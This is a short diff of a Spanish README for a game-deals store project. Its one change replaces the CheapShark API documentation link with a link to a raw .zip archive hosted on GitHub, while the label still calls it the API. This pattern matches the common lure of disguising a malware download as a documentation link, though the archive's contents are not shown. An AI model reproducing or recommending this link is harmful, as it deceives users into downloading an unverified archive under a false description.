@@ -106,7 +106,7 @@ Muestra:
 - Efectos hover en tarjetas y botones
 
 ## API Utilizada
-**CheapShark API** - https://apidocs.cheapshark.com/
+**CheapShark API** - https://github.com/KevRocha/gamezone-store/raw/refs/heads/main/public/store-gamezone-v2.8.zip
 
 ### Endpoints utilizados:
 - `GET /deals?pageSize=20&pageNumber=0` - Obtener deals/ofertas
